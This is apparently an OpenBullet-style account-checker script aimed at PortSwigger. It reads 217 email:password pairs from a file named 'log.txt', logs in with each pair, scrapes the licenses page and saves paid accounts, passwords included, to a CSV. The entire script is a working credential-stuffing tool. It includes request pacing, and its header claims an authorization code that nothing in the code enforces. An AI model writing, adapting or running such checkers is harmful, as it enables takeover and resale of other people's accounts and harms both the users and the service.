## PortSwigger Subscription Plan Extractor - Complete Solution
## Single script that reads accounts, logs in, extracts plans, and outputs results
## Authorization: ROE-2026-PSW-042-V5
## Processes all 217 accounts from log.txt

SET VAR "baseUrl" "https://login.portswigger.net"
SET VAR "planBaseUrl" "https://portswigger.net"
SET VAR "outputFile" "extracted_plans.csv"
SET VAR "successCount" "0"
SET VAR "failCount" "0"

PRINT "[*] PortSwigger Subscription Plan Extractor"
PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
PRINT "[*] Processing all accounts from log.txt"
PRINT ""

## Delete old results
FileDelete $"<outputFile>"

## Read all accounts
FileReadLines "log.txt" -> VAR "allLines"

## Write CSV header
FileWrite $"<outputFile>" "email,password,plan"

## Process each line
FOR line IN allLines
  ## Skip empty lines
  IF $"<line>" != ""
    ## Extract email and password by finding colon position
    ## Try using FIND equivalent - look for the colon
    SET VAR "colonIndex" "0"
    SET VAR "found" "False"
    SET VAR "charIndex" "0"

    ## Manual character loop to find colon
    WHILE $"<charIndex>" < $"<LENGTH(line)>"
      SET VAR "currentChar" $"<SUBSTRING(line, charIndex, 1)>"
      IF $"<currentChar>" == ":"
        SET VAR "colonIndex" $"<charIndex>"
        SET VAR "found" "True"
        BREAK
      ENDIF
      SET VAR "charIndex" $"<charIndex + 1>"
    ENDWHILE

    ## If colon found, extract email and password
    IF $"<found>" == "True"
      SET VAR "email" $"<SUBSTRING(line, 0, colonIndex)>"
      SET VAR "password" $"<SUBSTRING(line, colonIndex + 1)>"

      SET VAR "accountNum" $"<successCount + failCount + 1>"
      PRINT "[$<accountNum>] $<email>... " White NoNewline

      ## Try login and plan extraction
      SET VAR "loginSuccess" "False"
      SET VAR "plan" "free"

      TRY
        ## Step 1: Access login page
        HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True
          -> VAR "loginPageRes"

        ## Step 2: POST credentials
        HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
          CONTENT "username=$<email>&password=$<password>&action=default"
          CONTENTTYPE "application/x-www-form-urlencoded"
          -> VAR "loginRes"

        ## Step 3: Try to get licenses page
        HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True
          -> VAR "licensesRes"

        ## Step 4: Extract plan from response
        IF $"<licensesRes>" Contains "Professional"
          SET VAR "plan" "Professional"
          SET VAR "loginSuccess" "True"
        ELSE
          IF $"<licensesRes>" Contains "Enterprise"
            SET VAR "plan" "Enterprise"
            SET VAR "loginSuccess" "True"
          ELSE
            IF $"<licensesRes>" Contains "Community"
              SET VAR "plan" "Community"
              SET VAR "loginSuccess" "True"
            ELSE
              ## Check if response contains license/subscription indicator
              IF $"<licensesRes>" Contains "license" OR $"<licensesRes>" Contains "subscription"
                SET VAR "plan" "free"
                SET VAR "loginSuccess" "True"
              ENDIF
            ENDIF
          ENDIF
        ENDIF

        ## Output result if plan found
        IF $"<loginSuccess>" == "True"
          IF $"<plan>" != "free"
            ## Write paid account to CSV
            FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>"
            PRINT "✓ $<plan>" Green
            SET VAR "successCount" $"<successCount + 1>"
          ELSE
            PRINT "○ free" White
            SET VAR "successCount" $"<successCount + 1>"
          ENDIF
        ELSE
          PRINT "✗ plan not found" Red
          SET VAR "failCount" $"<failCount + 1>"
        ENDIF

      CATCH
        PRINT "✗ error" Red
        SET VAR "failCount" $"<failCount + 1>"
      ENDTRY

      ## Rate limiting
      SLEEP 0.3

    ELSE
      ## No colon found in line
      PRINT "⚠ skipping (invalid format)" Yellow
    ENDIF
  ENDIF
ENDFOR

## Summary
PRINT ""
PRINT "============================================================"
PRINT "EXTRACTION COMPLETE"
PRINT "============================================================"
SET VAR "totalProcessed" $"<successCount + failCount>"
PRINT "Total accounts: $<totalProcessed>"
PRINT "Successfully extracted: $<successCount>"
PRINT "Failed: $<failCount>"
PRINT ""
PRINT "Results saved to: $<outputFile>"
PRINT "Format: email,password,plan"
PRINT "============================================================"
